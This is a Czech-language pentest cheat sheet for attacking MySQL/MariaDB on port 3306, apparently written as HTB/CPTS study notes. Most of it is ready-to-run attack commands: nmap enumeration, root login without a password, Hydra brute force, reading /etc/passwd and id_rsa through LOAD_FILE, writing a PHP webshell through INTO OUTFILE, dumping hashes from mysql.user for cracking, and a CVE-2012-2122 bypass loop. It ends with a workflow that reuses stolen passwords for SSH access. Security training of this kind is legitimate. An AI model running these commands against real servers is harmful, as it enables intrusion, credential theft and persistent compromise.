# MySQL & MariaDB – Port 3306

MySQL/MariaDB je **relační databázový systém**, který běží nad **TCP**.

Komunikace začíná:

```
Server
 |
 | Handshake
 | - verze
 | - salt
 |
Client
```

Pokud není zapnuté SSL/TLS:

- dotazy
- odpovědi
- data

mohou být odposlechnuty.

---

# Enumerace

Cíl:

- zjistit verzi
- najít slabé přístupy
- zjistit databáze
- získat citlivá data

---

# Nmap Scan

```
nmap -sV -sC -p3306 \
--script mysql-info,mysql-empty-password,mysql-users,mysql-databases \
TARGET
```

Hledat:

- verzi MySQL/MariaDB
- prázdné heslo
- uživatele
- databáze

---

# Připojení k MySQL

## Login

```
mysql -h TARGET -u user -p
```

---

## Root bez hesla

```
mysql -h TARGET -u root
```

---

## Spuštění příkazu

```
mysql -h TARGET \
-u root \
-e "SHOW DATABASES;"
```

---

# MySQL Commands

## Databáze

Výpis:

```
SHOW DATABASES;
```

Výběr:

```
USE database;
```

Tabulky:

```
SHOW TABLES;
```

---

## Uživatel a práva

Aktuální účet:

```
SELECT user(), current_user();
```

Práva:

```
SHOW GRANTS;
```

---

# Útoky

---

# 1. Brute Force

MySQL často nemá dostatečné blokování pokusů.

Hydra:

```
hydra \
-l root \
-P rockyou.txt \
mysql://TARGET
```

---

# 2. FILE Privilege (Čtení/Zápis souborů)

Pokud má uživatel právo:

```
FILE
```

může pracovat se soubory systému.

---

## Čtení souboru

```
SELECT LOAD_FILE('/etc/passwd');
```

Možné cíle:

```
/etc/passwd
config.php
id_rsa
```

---

## Zápis souboru

Například webshell:

```
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

Podmínka:

- povolený zápis
- správná cesta
- `secure_file_priv` omezení

---

# 3. Extrakce Hashů

Pokud máš přístup k systémové databázi:

```
SELECT user, authentication_string 
FROM mysql.user;
```

Starší verze:

```
SELECT user,password 
FROM mysql.user;
```

Potom:

- Hashcat
- John the Ripper

---

# 4. CVE-2012-2122 Authentication Bypass

Starší MySQL/MariaDB chyba.

Princip:

- opakované přihlášení se špatným heslem
- server někdy přijme login

Příklad:

```
for i in {1..500}; do
mysql -u root -h TARGET -p'wrong'
done
```

---

# Hledání citlivých dat

## Sloupce s hesly

```
SELECT column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%';
```

Hledat:

```
password
passwd
hash
token
secret
key
```

---

# MySQL Privilege Check

Kontrola práv:

```
SELECT * 
FROM mysql.user;
```

Zajímavá oprávnění:

|Právo|Význam|
|---|---|
|FILE|Čtení/zápis souborů|
|SUPER|Vyšší oprávnění|
|GRANT OPTION|Udělování práv|
|ALL PRIVILEGES|Plný přístup|

---

# MySQL Pentest Checklist

☐ Port 3306 otevřený  
☐ Verze serveru  
☐ Root bez hesla  
☐ Slabé heslo  
☐ Externí přístup  
☐ Databáze dostupné  
☐ FILE privilege  
☐ Hashy uživatelů  
☐ Citlivé tabulky

---

# HTB / CPTS MySQL Workflow

```
Nmap
 ↓
Port 3306
 ↓
Version Detection
 ↓
Login Test
 ↓
Enumerate Databases
 ↓
Search Credentials
 ↓
Extract Hashes
 ↓
Password Reuse
 ↓
SSH / Web Access
```

---

# Nejčastější MySQL nálezy

| Finding        | Dopad                    |
| -------------- | ------------------------ |
| Root bez hesla | Kompletní DB přístup     |
| Slabé heslo    | Převzetí databáze        |
| Exposed 3306   | Útok z internetu         |
| FILE privilege | Čtení/zápis OS souborů   |
| Uložené hesla  | Přístup k dalším službám |